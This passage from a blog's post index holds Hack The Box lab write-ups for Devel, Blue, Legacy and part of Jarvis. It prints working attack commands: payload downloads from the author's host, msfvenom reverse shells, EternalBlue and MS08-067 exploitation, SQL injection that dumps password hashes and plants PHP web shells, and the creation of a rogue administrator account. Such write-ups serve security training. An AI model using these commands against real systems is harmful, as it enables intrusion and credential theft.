[01]: 10.10.10.5 [02]: fe80::58c0:f1cf:abc6:bb9e [03]: dead:beef::58c0:c14d:73fa:2284 [04]: dead:beef::58c0:f1cf:abc6:bb9e   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26  python2 /opt/Windows-Exploit-Suggester/windows-exploit-suggester.py --database /opt/Windows-Exploit-Suggester/2022-12-18-mssb.xls --systeminfo systeminfo.txt [*] database file detected as xls or xlsx based on extension [*] attempting to read from the systeminfo input file [+] systeminfo input file read successfully (utf-8) [*] querying database file for potential vulnerabilities [*] comparing the 0 hotfix(es) against the 179 potential bulletins(s) with a database of 137 known exploits [*] there are now 179 remaining vulns [+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin [+] windows version identified as \u0026#39;Windows 7 32-bit\u0026#39; [*] [M] MS13-009: Cumulative Security Update for Internet Explorer (2792100) - Critical [M] MS13-005: Vulnerability in Windows Kernel-Mode Driver Could Allow Elevation of Privilege (2778930) - Important [E] MS12-037: Cumulative Security Update for Internet Explorer (2699988) - Critical [*] http://www.exploit-db.com/exploits/35273/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP \u0026amp; EMET 5., PoC [*] http://www.exploit-db.com/exploits/34815/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP \u0026amp; EMET 5.0 Bypass (MS12-037), PoC [*] [E] MS11-011: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (2393802) - Important [M] MS10-073: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (981957) - Important [M] MS10-061: Vulnerability in Print Spooler Service Could Allow Remote Code Execution (2347290) - Critical [E] MS10-059: Vulnerabilities in the Tracing Feature for Services Could Allow Elevation of Privilege (982799) - Important [E] MS10-047: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (981852) - Important [M] MS10-015: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (977165) - Important [M] MS10-002: Cumulative Security Update for Internet Explorer (978207) - Critical [M] MS09-072: Cumulative Security Update for Internet Explorer (976325) - Critical [*] done   Worked with his payload: https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS10-059\npython2 -m SimpleHTTPServer 80\n1 2 3  cd cd:\\Users\\Public\\Downloads c:\\Users\\Public\\Downloads\u0026gt;certutil -split -f -urlcache http://10.10.14.12/MS10-059.exe   1 2 3  nc -lvnp 4321 c:\\Users\\Public\\Downloads\u0026gt;MS10-059.exe 10.10.14.12 4321   Skills Learned  Identifying vulnerable services Exploiting weak credentials Basic Windows privilege escalation techniques  ","description":"Devel, while relatively simple, demonstrates the security risks associated with some default program configurations. It is a beginner-level machine which can be completed using publicly available exploits.","id":1,"section":"posts","tags":["Hackthebox","OSCP","iis","asp","web","network","protocols","ftp","remote code execution","arbitrary file upload"],"title":"Hackthebox - Devel","uri":"https://hswootan.github.io/en/posts/devel/"},{"content":"\r\rEnumeration 1 2 3 4 5 6 7 8 9 10 11 12  nmap -p- 10.10.10.40 PORT STATE SERVICE 135/tcp open msrpc 139/tcp open netbios-ssn 445/tcp open microsoft-ds 49152/tcp open unknown 49153/tcp open unknown 49154/tcp open unknown 49155/tcp open unknown 49156/tcp open unknown 49157/tcp open unknown   1  nmap -sV -sC -vv -p 135,139,445,49152,49153,49154,49155,49156,49157 10.10.10.40 -oN blue_specific.txt   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39  PORT STATE SERVICE REASON VERSION 135/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 139/tcp open netbios-ssn syn-ack ttl 127 Microsoft Windows netbios-ssn 445/tcp open microsoft-ds syn-ack ttl 127 Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP) 49152/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 49153/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 49154/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 49155/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 49156/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 49157/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-security-mode: | 2.1: |_ Message signing enabled but not required | smb2-time: | date: 2022-07-13T18:41:22 |_ start_date: 2022-07-13T18:35:57 | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | p2p-conficker: | Checking for Conficker.C or higher... | Check 1 (port 41961/tcp): CLEAN (Couldn\u0026#39;t connect) | Check 2 (port 12383/tcp): CLEAN (Couldn\u0026#39;t connect) | Check 3 (port 19006/udp): CLEAN (Timeout) | Check 4 (port 46937/udp): CLEAN (Failed to receive data) |_ 0/4 checks are positive: Host is CLEAN or ports are blocked | smb-os-discovery: | OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1) | OS CPE: cpe:/o:microsoft:windows_7::sp1:professional | Computer name: haris-PC | NetBIOS computer name: HARIS-PC\\x00 | Workgroup: WORKGROUP\\x00 |_ System time: 2022-07-13T19:41:23+01:00 |_clock-skew: mean: -19m49s, deviation: 34m36s, median: 8s   Exploitation smbclient 1 2 3 4 5 6 7 8 9  smbclient --no-pass -L //10.10.10.40 Sharename Type Comment --------- ---- ------- ADMIN$ Disk Remote Admin C$ Disk Default share IPC$ IPC Remote IPC Share Disk Users Disk   1  nmap --script \u0026#34;safe or smb-enum-*\u0026#34; -p 445 10.10.10.40   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  | smb-vuln-ms17-010: | VULNERABLE: | Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010) | State: VULNERABLE | IDs: CVE:CVE-2017-0143 | Risk factor: HIGH | A critical remote code execution vulnerability exists in Microsoft SMBv1 | servers (ms17-010). | | Disclosure date: 2017-03-14 | References: | https://technet.microsoft.com/en-us/library/security/ms17-010.aspx | https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143 |_ https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/ | unusual-port: |_ WARNING: this script depends on Nmap\u0026#39;s service/version detection (-sV)    After running the nmap script to further enumerate. Found out that the machine is vulnerable to ms17-010 (EternalBlue)  https://www.rapid7.com/db/modules/exploit/windows/smb/ms17_010_eternalblue/\n1  msf6 auxiliary(scanner/smb/smb_enumshares) \u0026gt; search ms17-010   1 2 3 4  msf6 auxiliary(scanner/smb/smb_enumshares) \u0026gt; use 0 msf6 exploit(windows/smb/ms17_010_eternalblue) \u0026gt; set rhosts 10.10.10.40 msf6 exploit(windows/smb/ms17_010_eternalblue) \u0026gt; set lhost 10.10.14.23 msf6 exploit(windows/smb/ms17_010_eternalblue) \u0026gt; run   1  shell   1 2 3 4  meterpreter \u0026gt; pwd C:\\Users\\haris\\Desktop meterpreter \u0026gt; cat user.txt a67b70007d30108ac1cf5618f2299ef6   W/O Metasploit I was getting errors while running the exploit since it was written for python2. I didn’t have pip module for python2. If this happens install pip for python2 and install the impacket module\n1 2 3  sudo apt-get install python-pip python -m pip install impacket   https://www.exploit-db.com/exploits/42315\n Download mysmb it is in the link provided in the exploit https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/  Modify the exploit\n1 2  USERNAME = \u0026#39;\\\\\u0026#39; # tried also with guest and worked PASSWORD = \u0026#39;\u0026#39;   Generate payload through msfvenom\n1  msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.23 LPORT=1234 -f exe \u0026gt; shell.exe   Edit the payload add the path for your payload. The payload will be saved in the C directory and execute in the same. Since, it requires privilege we will drop it in the C directory and escape it with double \\\n1 2 3 4 5  smb_send_file(smbConn, \u0026#39;/home/sake/HTB/oscp_boxes/blue/shell.exe\u0026#39;, \u0026#39;C\u0026#39;, \u0026#39;/shell.exe\u0026#39;) service_exec(conn, r\u0026#39;cmd /c c:\\\\shell.exe\u0026#39;) # Note: there are many methods to get shell over SMB admin session # a simple method to get shell (but easily to be detected by AV) is # executing binary generated by \u0026#34;msfvenom -f exe-service ...\u0026#34;   Metasploit uses the following list of named pipes\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25  netlogon lsarpc samr browser atsvc DAV RPC SERVICE epmapper eventlog InitShutdown keysvc lsass LSM_API_service ntsvcs plugplay protected_storage router SapiServerPipeS-1-5-5-0-70123 scerpc srvsvc tapsrv trkwks W32TIME_ALT wkssvc PIPE_EVENTROOT\\CIMV2SCM EVENT PROVIDER db2remotecmd    Start listener  1 2 3  nc -lvnp 1234 python 42315.py 10.10.10.40 ntsvcs   Trying with AutoBlue\nhttps://github.com/3ndG4me/AutoBlue-MS17-010\nThis will be a little bit unstable after several attempts I was able to get the shell\n1  git clone https://github.com/3ndG4me/AutoBlue-MS17-010   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25  cd shellcode ./shell_prep.sh _.-;;-._ \u0026#39;-..-\u0026#39;| || | \u0026#39;-..-\u0026#39;|_.-;;-._| \u0026#39;-..-\u0026#39;| || | \u0026#39;-..-\u0026#39;|_.-\u0026#39;\u0026#39;-._| Eternal Blue Windows Shellcode Compiler Let\u0026#39;s compile them windoos shellcodezzz Compiling x64 kernel shellcode Compiling x86 kernel shellcode kernel shellcode compiled, would you like to auto generate a reverse shell with msfvenom? (Y/n) Y LHOST for reverse connection: 10.10.14.23 LPORT you want x64 to listen on: 1234 LPORT you want x86 to listen on: 1234 Type 0 to generate a meterpreter shell or 1 to generate a regular cmd shell 1 Type 0 to generate a staged payload or 1 to generate a stageless payload 1   1 2 3  nc -lvnp 1234 python eternalblue_exploit7.py 10.10.10.40 ./shellcode/sc_x64.bin   Post Exploitation Enable RDP on the machine\nhttps://www.windows-commandline.com/enable-remote-desktop-command-line/\n1  reg add \u0026#34;HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\u0026#34; /v fDenyTSConnections /t REG_DWORD /d 0 /f   Create and add user to the group of administrators\n1 2 3  net user sake password123 /add net localgroup administrators sake /add   Connect to the machine through rdesktop\n1  rdesktop 10.10.10.40   Skills Learned  Identifying Windows targets using SMB Exploit modification  ","description":"Blue, while possibly the most simple machine on Hack The Box, demonstrates the severity of the EternalBlue exploit, which has been used in multiple large-scale ransomware and crypto-mining attacks since it was leaked publicly.","id":2,"section":"posts","tags":["Hackthebox","OSCP","network","vulnerability assessment","protocols","outdated software","security tools","metasploit","smb","reconnaissance","remote code execution"],"title":"Hackthebox - Blue","uri":"https://hswootan.github.io/en/posts/blue/"},{"content":"\r\rEnumeration 1 2 3 4 5 6  nmap -p- -vv 10.10.10.4 PORT STATE SERVICE REASON 135/tcp open msrpc syn-ack ttl 127 139/tcp open netbios-ssn syn-ack ttl 127 445/tcp open microsoft-ds syn-ack ttl 127   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43  nmap -sV -sC -vv -p135,139,445 10.10.10.4 -oN legacy_scan.txt PORT STATE SERVICE REASON VERSION 135/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 139/tcp open netbios-ssn syn-ack ttl 127 Microsoft Windows netbios-ssn 445/tcp open microsoft-ds syn-ack ttl 127 Windows XP microsoft-ds Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp Host script results: |_smb2-time: Protocol negotiation failed (SMB2) |_clock-skew: mean: 5d00h27m45s, deviation: 2h07m16s, median: 4d22h57m45s |_smb2-security-mode: Couldn\u0026#39;t establish a SMBv2 connection. | nbstat: NetBIOS name: LEGACY, NetBIOS user: \u0026lt;unknown\u0026gt;, NetBIOS MAC: 00:50:56:b9:8d:50 (VMware) | Names: | LEGACY\u0026lt;00\u0026gt; Flags: \u0026lt;unique\u0026gt;\u0026lt;active\u0026gt; | HTB\u0026lt;00\u0026gt; Flags: \u0026lt;group\u0026gt;\u0026lt;active\u0026gt; | LEGACY\u0026lt;20\u0026gt; Flags: \u0026lt;unique\u0026gt;\u0026lt;active\u0026gt; | HTB\u0026lt;1e\u0026gt; Flags: \u0026lt;group\u0026gt;\u0026lt;active\u0026gt; | HTB\u0026lt;1d\u0026gt; Flags: \u0026lt;unique\u0026gt;\u0026lt;active\u0026gt; | \\x01\\x02__MSBROWSE__\\x02\u0026lt;01\u0026gt; Flags: \u0026lt;group\u0026gt;\u0026lt;active\u0026gt; | Statistics: | 00 50 56 b9 8d 50 00 00 00 00 00 00 00 00 00 00 00 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 |_ 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | p2p-conficker: | Checking for Conficker.C or higher... | Check 1 (port 40600/tcp): CLEAN (Couldn\u0026#39;t connect) | Check 2 (port 50011/tcp): CLEAN (Couldn\u0026#39;t connect) | Check 3 (port 50902/udp): CLEAN (Failed to receive data) | Check 4 (port 34932/udp): CLEAN (Failed to receive data) |_ 0/4 checks are positive: Host is CLEAN or ports are blocked | smb-security-mode: | account_used: \u0026lt;blank\u0026gt; | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb-os-discovery: | OS: Windows XP (Windows 2000 LAN Manager) | OS CPE: cpe:/o:microsoft:windows_xp::- | Computer name: legacy | NetBIOS computer name: LEGACY\\x00 | Workgroup: HTB\\x00 |_ System time: 2022-07-19T01:55:49+03:00   Exploitation Came across that the application is vulnerable to MS08-067. https://www.rapid7.com/db/modules/exploit/windows/smb/ms08_067_netapi/\n1 2  msfconsole search MS08-067   1 2 3 4 5  msf6 exploit(windows/smb/ms08_067_netapi) \u0026gt; set rhosts 10.10.10.4 msf6 exploit(windows/smb/ms08_067_netapi) \u0026gt; set lhost 10.10.14.23 msf6 exploit(windows/smb/ms08_067_netapi) \u0026gt; run shell   1 2 3  C:\\Documents and Settings\\john\\Desktop\u0026gt;more user.txt more user.txt e69af0e4f443de7e36876fda4ec7644f   1 2 3  C:\\Documents and Settings\\Administrator\\Desktop\u0026gt;more root.txt more root.txt 993442d258b0e0ec917cae9e695d5713   Skills Learned  Identifying vulnerable services Exploiting SMB  ","description":"Legacy is a fairly straightforward beginner-level machine which demonstrates the potential security risks of SMB on Windows. Only one publicly available exploit is required to obtain administrator access.","id":3,"section":"posts","tags":["Hackthebox","OSCP","samba","network","vulnerability assessment","protocols","outdated software","security tools","metasploit","remote code execution"],"title":"Hackthebox - Legacy","uri":"https://hswootan.github.io/en/posts/legacy/"},{"content":"\r\rEnumeration 1 2 3 4 5 6  nmap -p- -vv 10.10.10.143 -oN jarvis_allports.txt PORT STATE SERVICE REASON 22/tcp open ssh syn-ack ttl 63 80/tcp open http syn-ack ttl 63 64999/tcp open unknown syn-ack ttl 63   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26  nmap -sV -sC -vv -p 22,80,64999 10.10.10.143 -oN jarvis_specific.txt PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 63 OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0) | ssh-hostkey: | 2048 03:f3:4e:22:36:3e:3b:81:30:79:ed:49:67:65:16:67 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzv4ZGiO8sDRbIsdZhchg+dZEot3z8++mrp9m0VjP6qxr70SwkE0VGu+GkH7vGapJQLMvjTLjyHojU/AcEm9MWTRWdpIrsUirgawwROic6HmdK2e0bVUZa8fNJIoyY1vPa4uNJRKZ+FNoT8qdl9kvG1NGdBl1+zoFbR9az0sgcNZJ1lZzZNnr7zv/Jghd/ZWjeiiVykomVRfSUCZe5qZ/aV6uVmBQ/mdqpXyxPIl1pG642C5j5K84su8CyoiSf0WJ2Vj8GLiKU3EXQzluQ8QJJPJTjj028yuLjDLrtugoFn43O6+IolMZZvGU9Man5Iy5OEWBay9Tn0UDSdjbSPi1X | 256 25:d8:08:a8:4d:6d:e8:d2:f8:43:4a:2c:20:c8:5a:f6 (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCDW2OapO3Dq1CHlnKtWhDucQdl2yQNJA79qP0TDmZBR967hxE9ESMegRuGfQYq0brLSR8Xi6f3O8XL+3bbWbGQ= | 256 77:d4:ae:1f:b0:be:15:1f:f8💿c8:15:3a:c3:69:e1 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPuKufVSUgOG304mZjkK8IrZcAGMm76Rfmq2by7C0Nmo 80/tcp open http syn-ack ttl 63 Apache httpd 2.4.25 ((Debian)) |_http-server-header: Apache/2.4.25 (Debian) |_http-title: Stark Hotel | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS 64999/tcp open http syn-ack ttl 63 Apache httpd 2.4.25 ((Debian)) |_http-server-header: Apache/2.4.25 (Debian) |_http-title: Site doesn\u0026#39;t have a title (text/html). | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel   Directory Enumeration 1 2 3 4 5 6 7 8 9 10 11 12 13 14  gobuster dir --url http://10.10.10.143// -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt /images (Status: 301) [Size: 313] [--\u0026gt; http://10.10.10.143/images/] /index.php (Status: 200) [Size: 23628] /nav.php (Status: 200) [Size: 1333] /footer.php (Status: 200) [Size: 2237] /css (Status: 301) [Size: 310] [--\u0026gt; http://10.10.10.143/css/] /js (Status: 301) [Size: 309] [--\u0026gt; http://10.10.10.143/js/] /fonts (Status: 301) [Size: 312] [--\u0026gt; http://10.10.10.143/fonts/] /phpmyadmin (Status: 301) [Size: 317] [--\u0026gt; http://10.10.10.143/phpmyadmin/] /connection.php (Status: 200) [Size: 0] /room.php (Status: 302) [Size: 3024] [--\u0026gt; index.php] /sass (Status: 301) [Size: 311] [--\u0026gt; http://10.10.10.143/sass/] /server-status (Status: 403) [Size: 300]   1  wfuzz -u http://10.10.10.143/room.php\\?cod\\=1FUZZ -w /usr/share/wordlists/seclists/Fuzzing/special-chars.txt   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36  ===================================================================== ID Response Lines Word Chars Payload ===================================================================== 000000001: 200 189 L 443 W 5916 Ch \u0026#34;~\u0026#34; 000000003: 200 189 L 443 W 5916 Ch \u0026#34;@\u0026#34; 000000030: 200 189 L 443 W 5916 Ch \u0026#34;\u0026#34;\u0026#34; 000000029: 200 189 L 443 W 5916 Ch \u0026#34;\u0026#39;\u0026#34; 000000007: 200 189 L 443 W 5916 Ch \u0026#34;^\u0026#34; 000000015: 200 189 L 443 W 5916 Ch \u0026#34;=\u0026#34; 000000031: 200 189 L 443 W 5916 Ch \u0026#34;\u0026lt;\u0026#34; 000000032: 200 189 L 443 W 5916 Ch \u0026#34;\u0026gt;\u0026#34; 000000014: 200 190 L 466 W 6204 Ch \u0026#34;+\u0026#34; 000000028: 200 189 L 443 W 5916 Ch \u0026#34;:\u0026#34; 000000024: 200 190 L 466 W 6204 Ch \u0026#34;.\u0026#34; 000000023: 200 189 L 443 W 5916 Ch \u0026#34;,\u0026#34; 000000022: 200 189 L 443 W 5916 Ch \u0026#34;`\u0026#34; 000000019: 200 189 L 443 W 5916 Ch \u0026#34;[\u0026#34; 000000018: 200 189 L 443 W 5916 Ch \u0026#34;]\u0026#34; 000000027: 200 190 L 466 W 6204 Ch \u0026#34;;\u0026#34; 000000026: 200 189 L 443 W 5916 Ch \u0026#34;?\u0026#34; 000000025: 200 189 L 443 W 5916 Ch \u0026#34;/\u0026#34; 000000021: 200 189 L 443 W 5916 Ch \u0026#34;\\\u0026#34; 000000020: 200 189 L 443 W 5916 Ch \u0026#34;|\u0026#34; 000000008: 200 190 L 466 W 6204 Ch \u0026#34;\u0026amp;\u0026#34; 000000017: 200 189 L 443 W 5916 Ch \u0026#34;}\u0026#34; 000000016: 200 189 L 443 W 5916 Ch \u0026#34;{\u0026#34; 000000006: 200 189 L 443 W 5916 Ch \u0026#34;%\u0026#34; 000000012: 200 189 L 443 W 5916 Ch \u0026#34;-\u0026#34; 000000013: 200 189 L 443 W 5916 Ch \u0026#34;_\u0026#34; 000000011: 200 189 L 443 W 5916 Ch \u0026#34;)\u0026#34; 000000010: 200 189 L 443 W 5916 Ch \u0026#34;(\u0026#34; 000000009: 200 189 L 443 W 5916 Ch \u0026#34;*\u0026#34; 000000002: 200 189 L 443 W 5916 Ch \u0026#34;!\u0026#34; 000000004: 200 190 L 466 W 6204 Ch \u0026#34;#\u0026#34; 000000005: 200 189 L 443 W 5916 Ch \u0026#34;$\u0026#34;   WFUZZ used to find not linked directories, servlets, parameters for checking different kind of injections (SQL, XSS, LDAP, etc)\n1 2 3  weird-characters.txt --- +, ., ;, \u0026amp;, #    Exploitation   Testing for SQL injection\n  https://dev.mysql.com/doc/refman/8.0/en/information-schema-schemata-table.htmlhttps://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet\n  https://perspectiverisk.com/mysql-sql-injection-practical-cheat-sheet/\n  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24  ?cod=10 union select 1,2,\u0026#34;hello World\u0026#34;,4,5,6,7 ?cod=10 union select 1,2,(select @@version),4,5,6,7 ?cod=10 union select 1,2,(select schema_name from information_schema.schemata limit 1 ),4,5,6,7 ?cod=-1 union select 1,2,3,4,5,6,7 ?cod=-1 union select 1,2,database(),4,5,6,7 # hotel ?cod=-1 union select 1,2,version(),4,5,6,7 # 10.1.37-MariaDB-0+deb9u1 ?cod=-1 union select 1,2,user(),4,5,6,7 # DBadmin@localhost ?cod=-1 union select 1,2,load_file(\u0026#34;/etc/passwd\u0026#34;),4,5,6,7 # Shows the content of /etc/passwd ?cod=-1 union select 1,2,schema_name,4,5,6,7 from information_schema.schemata # List database names  ?cod=-1 union select 1,2,schema_name,4,5,6,7 from information_schema.schemata limit 0,1 # Limits the output to 1, lists hotel db ?cod=-1 union select 1,2,schema_name,4,5,6,7 from information_schema.schemata limit 1,1 # displays information_schema db ?cod=-1 union select 1,2,schema_name,4,5,6,7 from information_schema.schemata limit 2,1 # displays mysql db ?cod=-1 union select 1,2,schema_name,4,5,6,7 from information_schema.schemata limit 3,1 # displays performance_schema db ?cod=-1 union select 1,2,table_name,4,5,6,7 from information_schema.tables where table_schema=\u0026#34;hotel\u0026#34; limit 0,1 # room table. list tables from hotel database ?cod=-1 union select 1,2,column_name,4,5,6,7 from information_schema.columns where table_schema=\u0026#34;hotel\u0026#34; limit 0,1 # column cod in room table ?cod=-1 union select 1,2,column_name,4,5,6,7 from information_schema.columns where table_schema=\u0026#34;hotel\u0026#34; limit 1,1 # column name in room table ?cod=-1 union select 1,2,column_name,4,5,6,7 from information_schema.columns where table_schema=\u0026#34;hotel\u0026#34; limit 2,1 # column price in room table ?cod=-1 union select 1,2,group_concat(column_name),4,5,6,7 from information_schema.columns where table_schema=\u0026#34;hotel\u0026#34; # displays all the columns in the room table ?cod=10 union select 1,2,group_concat(table_name,column_name),4,5,6,7 from information_schema.columns where table_schema=\u0026#34;hotel\u0026#34; ?cod=10 union select 1,2,group_concat(table_name,column_name),4,5,6,7 from information_schema.columns where table_schema=\u0026#34;mysql\u0026#34; ?cod=10 union select 1,2,group_concat(host,user,password ),4,5,6,7 from mysql.user # will find the hash for mysql  ?cod=10 union select 1,2,group_concat(user),4,5,6,7 from mysql.user # Found user for mysql ?cod=100 union select 1,2,group_concat(host,user, password),4,5,6,7 from mysql.user # Get the password hash   Bash script to also automate the name column for the room table or can use the group_concat()\n1  for i in $(seq 0 15); do echo \u0026#34;[+] for $i: $(curl -s -X GET \u0026#34;http://10.10.10.143/room.php\\?cod\\=-1%20union%20select%201,2,column_name,4,5,6,7%20from%20information_schema.columns%20where%20table_schema\\=%22hotel%22%20limit%20$1,1\u0026#34; | grep \u0026#34;price-room\u0026#34; | html2text)\u0026#34;; done   1  localhostDBadmin*2D2B7A5E4E637B8FBA1D17F40318F277D29964D0   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  hash-identifier \u0026#34;2D2B7A5E4E637B8FBA1D17F40318F277D29964D0\u0026#34; ######################################################################### # __ __ __ ______ _____ # # /\\ \\/\\ \\ /\\ \\ /\\__ _\\ /\\ _ `\\ # # \\ \\ \\_\\ \\ __ ____ \\ \\ \\___ \\/_/\\ \\/ \\ \\ \\/\\ \\ # # \\ \\ _ \\ /\u0026#39;__`\\ / ,__\\ \\ \\ _ `\\ \\ \\ \\ \\ \\ \\ \\ \\ # # \\ \\ \\ \\ \\/\\ \\_\\ \\_/\\__, `\\ \\ \\ \\ \\ \\ \\_\\ \\__ \\ \\ \\_\\ \\ # # \\ \\_\\ \\_\\ \\___ \\_\\/\\____/ \\ \\_\\ \\_\\ /\\_____\\ \\ \\____/ # # \\/_/\\/_/\\/__/\\/_/\\/___/ \\/_/\\/_/ \\/_____/ \\/___/ v1.2 # # By Zion3R # # www.Blackploit.com # # Root@Blackploit.com # ######################################################################### -------------------------------------------------- Possible Hashs: [+] SHA-1 [+] MySQL5 - SHA-1(SHA-1($pass))   1 2  echo \u0026#34;2D2B7A5E4E637B8FBA1D17F40318F277D29964D0\u0026#34; | wc -m 41   According to hashcat is the mode 300\nUsed hashcat on my Windows machine\n1  .\\hashcat.exe -m 300 .\\jarvis_hash.txt .\\rockyou.txt   1  2d2b7a5e4e637b8fba1d17f40318f277d29964d0:imissyou    Found user for the password hash  1 2  ?cod=10 union select 1,2,group_concat(user),4,5,6,7 from mysql.user DBadmin   Potential creds for phpmyadmin → DBadmin : imissyouPotential creds for phpmyadmin → DBadmin : imissyou\nLOAD_FILE feature in for sqli to read files\n1  ?cod=100 union select 1,2,load_file(\u0026#34;/etc/passwd\u0026#34;),4,5,6,7   Can also read the php source cood from the machine\n1  ?cod=100 union select 1,2,load_file(\u0026#34;/var/www/html/room.php\u0026#34;),4,5,6,7   First method to get remote code execution\nRemote code execution on phpmyadmin 4.8.0: https://blog.vulnspy.com/2018/06/21/phpMyAdmin-4-8-x-Authorited-CLI-to-RCE/\n1  http://10.10.10.143/phpmyadmin/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/sessions/sess_lhblk2nhn0chl0k4ql5at5dt0jbor9o1    Get the php-reverse shell and edit the file host the file to be transfered to the targeted machine python -m SimpleHTTPServer Start netcat listener Login into /phpmyadmin\nSQL → SELECT '\u0026lt;?php exec(\u0026quot;wget -O /var/www/html/rev.php \u0026lt;http://10.10.14.25:8000/rev.php\u0026gt;\u0026quot;); ?\u0026gt;'  1  10.10.10.143/phpmyadmin/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/sessions/sess_6d0mgp6pkovuhgapifeku11udb4r49ng   Interactive shell\n1 2 3 4 5 6 7 8 9  python -c \u0026#39;import pty; pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; CTRL + Z stty raw -echo fg [Press Enter] export TERM=screen   Second method to get remote code execution 1  ?cod=100 union select 1,2,\u0026#39;\u0026lt;?php phpinfo(); ?\u0026gt;\u0026#39;,4,5,6,7 INTO OUTFILE \u0026#39;/var/www/html/myinfo.php\u0026#39;   Going into the file we outfile into /myinfo.php to test possible rce\n Host the reverse-php with python server Start netcat listener  1  /room.php?cod=100 union select 1,2,\u0026#39;\u0026lt;?php exec(\u0026#34;wget http://10.10.14.25:8000/reverse.php\u0026#34;); ?\u0026gt;\u0026#39;,4,5,6,7 INTO OUTFILE \u0026#39;/var/www/html/reverse.php\u0026#39;    To execute the code simply go into /reverse.php  Privilege Escalation Privilege Escalation to user pepper 1 2 3 4 5 6 7  www-data@jarvis:/bin$ sudo -l Matching Defaults entries for www-data on jarvis: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin User www-data may run the following commands on jarvis: (pepper : ALL) NOPASSWD: /var/www/Admin-Utilities/simpler.py   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150  simplery.py --- #!/usr/bin/env python3 from datetime import datetime import sys import os from os import listdir import re def show_help(): message=\u0026#39;\u0026#39;\u0026#39; ******************************************************** * Simpler - A simple simplifier ;) * * Version 1.0 * ******************************************************** Usage: python3 simpler.py [options] Options: -h/--help : This help -s : Statistics -l : List the attackers IP -p : ping an attacker IP \u0026#39;\u0026#39;\u0026#39; print(message) def show_header(): print(\u0026#39;\u0026#39;\u0026#39;*********************************************** _ _ ___(_)_ __ ___ _ __ | | ___ _ __ _ __ _ _ / __| | \u0026#39;_ ` _ \\| \u0026#39;_ \\| |/ _ \\ \u0026#39;__| \u0026#39;_ \\| | | | \\__ \\ | | | | | | 